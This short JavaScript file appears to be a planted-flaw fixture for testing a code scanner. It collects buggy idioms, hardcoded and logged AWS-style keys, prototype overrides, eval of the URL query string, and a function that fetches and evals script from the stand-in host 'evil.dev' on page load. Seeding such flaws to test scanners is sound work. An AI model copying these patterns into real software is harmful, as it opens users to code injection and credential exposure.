var p;
async function main() {
    const accessKeyId = 'AKIA5VFJG5SHNEQRRJOG';
    const secretKey = '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'
    console.log('Lets try code scanning', { accessKeyId, secretKey})

    function extend(dest, src) {
        for (p in src)
            dest[p] = src[p];
        return dest;
    }

    const foobar = extend({}, {bar: 'foo'})
    console.log(foobar)

    const foo = Number('abc123')
    console.log(foo == NaN, foo ===NaN);

    const abc = ['abc']
    console.log(abc === ['abc'])

    Object.prototype.toString = ()=> 'Hahahaha';
    Array.prototype.toString = Object.prototype.toString;
    console.log({}.toString(), abc.toString(), foobar.toString())

    // What is the point of i?
    for (var i = 0; i < abc.length; i ++) {
        console.log(abc[0])
    }

    const loc = 'foo';
    if (Math.random() < 0.5) loc = 'bar'
}

/** Fetch data from a url and eval it! #safe-as-houses */
function fetchAndEval(url) {
    return fetch(url).then(res => res.text()).then(rawText => eval(rawText));
}

function evalMyLocationBar() {
    document.addEventListener('DOMContentLoaded', () => {
        eval(window.location.search)
        fetchAndEval('http://evil.dev/seems-ok.js')
    })
}

main().catch(console.error)
